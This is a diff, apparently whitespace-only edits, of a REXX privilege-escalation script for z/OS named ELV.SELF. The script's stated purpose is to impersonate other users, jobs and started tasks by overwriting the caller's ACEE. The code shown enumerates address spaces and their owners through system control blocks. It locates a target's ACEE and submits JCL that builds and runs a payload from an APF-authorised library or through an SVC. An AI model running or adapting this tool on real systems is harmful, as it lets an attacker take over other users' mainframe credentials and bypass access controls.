@@ -4,7 +4,7 @@
 /*  ELV.SELF is a tool to impersonate users/jobs/started tasks on z/OS.      */
 /*  It overwrites the caller's ACEE structure with a foreign ACEE            */
 /*  owned by another task/user/job.                                          */
-/*  The current TSO session is patched giving the caller credentials         */  
+/*  The current TSO session is patched giving the caller credentials         */
 /*  of the chosen target (attributes, groups, console, etc.)                 */
 /*                                                                           */
 /*  Requirement: APF library with ALTER access, or SVC granting AUTH         */
@@ -34,23 +34,23 @@ if (parm1 = "LIST" | parm1 ="") then
     say ""
     call list_address_spaces
     exit
-  END 
+  END
 
 if parm2 = "APF" then
-  DO    
+  DO
     type = "APF"
     dsn = value2
   END
 
 if parm3 = "SVC" then
-  DO    
+  DO
     type = "SVC"
     dsn = value2
     svc_num = value3
     svc_reg = parm4
-    svc_reg_v = value4    
+    svc_reg_v = value4
   END
-  
+
 target = value1
 
 
@@ -59,7 +59,7 @@ target = value1
 **/
 
 priv  =  check_priv(dsn)
-say ""    
+say ""
 if (priv == "NONE") then do
     say "Not enough privileges to alter PDS library "dsn
     exit(-1)
@@ -139,9 +139,9 @@ launch_payload(rmt_asid,local_asid,local_acee,dsn,svc_num,svc_reg,svc_reg_v)
 
 get_asid:
 
-    name = arg(1) 
+    name = arg(1)
     asid = -1
-    
+
     cvt=ptr(16)
     asvt=ptr(cvt+556)+512
     asvtmaxu=ptr(asvt+4)
@@ -149,10 +149,10 @@ get_asid:
         ascb=stg(asvt+16+a*4,4)
         If bitand(ascb,'80000000'x) = '00000000'x Then
         Do
-            ascb=c2d(ascb) 
-            ascbjbni=ptr(ascb+172) 
+            ascb=c2d(ascb)
+            ascbjbni=ptr(ascb+172)
             ascbjbni=stg(ascbjbni,8)
-            ascbjbns=ptr(ascb+176) 
+            ascbjbns=ptr(ascb+176)
             ascbjbns=stg(ascbjbns,8)
             if (name = strip(ascbjbns) | name = strip(ascbjbni)) then
               DO
@@ -160,9 +160,9 @@ get_asid:
               END
         End
     End
-    
+
     return asid
-    
+
 exit
 
 /**
@@ -172,10 +172,10 @@ exit
 get_acee:
     ascb = storage(224,4) /* psaaold */
     asxb = storage(d2x(c2d(ascb)+108),4) /* ascbasxb */
-    acee = storage(d2x(c2d(asxb)+200),4) /* acee */ 
+    acee = storage(d2x(c2d(asxb)+200),4) /* acee */
     if acee <> 0 then do
         return acee
-    else 
+    else
         say "could not get local ACEE structure"
         exit
     end
@@ -187,109 +187,109 @@ get_acee:
 
 list_address_spaces:
 
-cvt=ptr(16)                            /* Get CVT                    */ 
-asvt=ptr(cvt+556)+512                  /* Get asvt                   */ 
+cvt=ptr(16)                            /* Get CVT                    */
+asvt=ptr(cvt+556)+512                  /* Get asvt                   */
 
 
-tso_users.0 = 0 
+tso_users.0 = 0
 tasks.0 = 0
 tasks_users.0 = 0
 jobs.0 = 0
 jobs_users.0 = 0
 system.0 = 0
 
-asvtmaxu=ptr(asvt+4)                   /* Get max asvt entries       */ 
-Do a = 0 to asvtmaxu - 1                                                
-  ascb=stg(asvt+16+a*4,4)              /* Get ptr to ascb (Skip master) */   
-                
-  If bitand(ascb,'80000000'x) = '00000000'x Then /* If in use        */ 
-    Do                                                                  
-      ascb=c2d(ascb)                   /* Get ascb address           */ 
-      cscb=ptr(ascb+56)                /* Get CSCB address           */ 
-      chtrkid=stg(cscb+28,1)           /* Check addr space type      */ 
-      ascbjbni=ptr(ascb+172)           /* Get ascbjbni               */ 
-      ascbjbns=ptr(ascb+176)           /* Get ascbjbns               */ 
+asvtmaxu=ptr(asvt+4)                   /* Get max asvt entries       */
+Do a = 0 to asvtmaxu - 1
+  ascb=stg(asvt+16+a*4,4)              /* Get ptr to ascb (Skip master) */
+
+  If bitand(ascb,'80000000'x) = '00000000'x Then /* If in use        */
+    Do
+      ascb=c2d(ascb)                   /* Get ascb address           */
+      cscb=ptr(ascb+56)                /* Get CSCB address           */
+      chtrkid=stg(cscb+28,1)           /* Check addr space type      */
+      ascbjbni=ptr(ascb+172)           /* Get ascbjbni               */
+      ascbjbns=ptr(ascb+176)           /* Get ascbjbns               */
       asxb = ptr(ascb+108)
-      
-      acee = ptr(asxb+200)      
-      
+
+      acee = ptr(asxb+200)
+
       ftcb = ptr(asxb+4)
       ltcb = ptr(asxb+8)
-      
-            
+
+
       If ascbjbns<>0 & chtrkid = '02'x Then  /* started task */
-        Do                                                             
+        Do
           assb = ptr(ascb+336)
           jsab = ptr(assb+168)
           if jsab = 0 then
             usid = ""
           else
             usid = stg(jsab+44,8)
-          
+
           tmp = tasks.0 + 1
           tasks.tmp = stg(ascbjbns,8)
           tasks_users.tmp = usid
-          tasks.0 = tmp   
-               
-          
+          tasks.0 = tmp
+
+
         End
       If ascbjbns<>0 & chtrkid = '01'x Then  /* TSO user */
-        Do                                                             
+        Do
           tmp = tso_users.0 + 1
           tso_users.tmp = stg(ascbjbns,8)
           tso_users.0 = tmp
-          
+
         End
       If ascbjbns<>0 & chtrkid = '04'x Then  /* System */
-        Do                                                             
+        Do
           tmp = system.0 + 1
           system.tmp = stg(ascbjbns,8)
           system.0 = tmp
-          
+
         End
       If ascbjbni<>0 & chtrkid = '03'x Then  /* JOBS */
-        Do                                                             
+        Do
           assb = ptr(ascb+336)
           jsab = ptr(assb+168)
           usid = stg(jsab+44,8)
-          
+
           if jsab = 0 then
             usid = ""
           else
             usid = stg(jsab+44,8)
-            
+
           tmp = jobs.0 + 1
           jobs.tmp = stg(ascbjbni,8)
           jobs_users.tmp = usid
           jobs.0 = tmp
-        
-          
+
+
         End
-    End                                                                
+    End
 End
 
 say "**** Started Task - Owner *****"
 DO i = 1 to tasks.0
-   say tasks.i " - " tasks_users.i 
-END                                                       
+   say tasks.i " - " tasks_users.i
+END
 
 say ""
 say "**** TSO Users - Owner ****"
 DO i = 1 to tso_users.0
-   say tso_users.i " - " tso_users.i 
+   say tso_users.i " - " tso_users.i
 END
 
 say ""
 say "**** Jobs - Owner ****"
 DO i = 1 to jobs.0
-   say jobs.i " - " jobs_users.i 
+   say jobs.i " - " jobs_users.i
 END
 
 Return
-exit                                                                  
-/*-------------------------------------------------------------------*/ 
-ptr:  Return c2d(storage(d2x(Arg(1)),4))     /* Return a pointer */    
-/*-------------------------------------------------------------------*/ 
+exit
+/*-------------------------------------------------------------------*/
+ptr:  Return c2d(storage(d2x(Arg(1)),4))     /* Return a pointer */
+/*-------------------------------------------------------------------*/
 stg:  Return storage(d2x(Arg(1)),Arg(2))     /* Return storage */
 
 launch_payload:
@@ -301,15 +301,15 @@ launch_payload:
     svc_reg = arg(6)
     svc_reg_v = arg(7)
     say dsn
-    
-    
-    PROG = rand_char(6)    
+
+
+    PROG = rand_char(6)
     if svc_num <> "SVC_NUM" then
         say "Compiling " PROG "in" dsn ", using SVC " svc_num
     else
         say "Compiling " PROG "in APF" dsn
-    
-    
+
+
     QUEUE "//ELVSELF  JOB (JOBNAME),'XSS',CLASS=A,"
     QUEUE "//*            TYPRUN=SCAN,"
     QUEUE "//             MSGLEVEL=(1,1),MSGCLASS=K,NOTIFY=&SYSUID"
@@ -448,10 +448,10 @@ launch_payload:
     QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
     QUEUE "//STEPLIB   DD DSN="||dsn||",DISP=SHR"
     QUEUE "$$"
-    
-    o = OUTTRAP("output.",,"CONCAT")       
+
+    o = OUTTRAP("output.",,"CONCAT")
     address tso "SUBMIT * END($$)"
-    o = OUTTRAP(OFF) 
+    o = OUTTRAP(OFF)
 
     exit(0)
 
